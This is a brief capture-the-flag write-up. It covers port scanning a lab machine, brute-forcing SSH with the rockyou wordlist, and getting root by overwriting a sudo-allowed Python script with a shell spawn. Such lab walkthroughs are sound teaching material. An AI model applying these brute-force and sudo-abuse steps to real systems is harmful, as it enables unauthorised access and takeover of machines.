
## NMAP Scan

```bash
nmap -sVC -O -nP _TARGET
```

There is 2 open port at: 22 (SSH) and 80 (Apache)

## Gobuster scan

- At the index.html found an username `meliodas`
- Open robots.txt show User-Agent: `rockyou`
That give an idea to brute force SSH with username `meliodas` and password directory `rockyou.txt`

## Brute  force SSH

I use `metasploit` with `ssh_login` module. seemly slow than use `hydra`

Found password of `meliodas` is `iloveyou1`

Get first flag by reading `user.txt` file.

## Privilege root

Enter command:
```bash
sudo -l
```
Got the output `(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py`. That mean I can using python script to get a root permission. 
Using command:
```bash
ls -l
```
I see that the bak.py is write protected, so i remove it and re-create it as below to get root shell:
```python
import os

os.system("/bin/sh -i")
```
Then run:
```bash
sudo /usr/bin/python /home/meliodas/bak.py
```
Boom. Got the root shell. Straightforward to the root folder and read the `root.txt` file to get the last flag.